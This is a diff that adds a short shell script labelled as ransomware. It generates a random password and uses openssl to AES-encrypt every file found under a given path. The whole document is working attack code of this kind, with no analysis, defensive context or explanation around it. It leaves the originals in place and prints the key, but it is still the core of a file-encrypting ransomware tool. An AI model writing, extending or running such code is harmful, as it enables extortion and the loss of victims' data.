@@ -1,0 +1,16 @@
+#!/bin/sh
+# ransomware [PATH] 
+readonly path="$1"
+
+if [ -z $path ]; then
+    echo "$0 [PATH]" >&2
+    exit 1
+fi
+
+pass=$(dd if=/dev/random bs=33 count=1 2>/dev/null | base64)
+echo "AES password is $pass"
+for file in $(find $path -type f)
+do
+    openssl enc -aes256 -pbkdf2 -md sha-256 -a -salt -k "$pass" -in "$file" -out "${file}.enc"
+done
+
